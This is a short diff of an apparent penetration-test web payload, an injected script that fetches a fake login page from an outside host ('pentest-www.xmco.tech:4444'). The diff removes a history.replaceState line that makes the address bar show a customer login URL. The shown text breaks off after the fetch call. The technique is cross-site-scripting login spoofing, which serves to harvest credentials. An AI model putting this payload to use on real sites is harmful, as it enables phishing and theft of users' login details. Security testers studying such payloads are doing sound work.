@@ -1,7 +1,5 @@
 ```
 <script>
-history.replaceState(null, null, "/CustomerLogin.aspx?ReturnUrl=%2fProductDetails.aspx");
-
 fetch("http://pentest-www.xmco.tech:4444/LoginPage.html")
   .then(response => response.text())
   .then(html => {
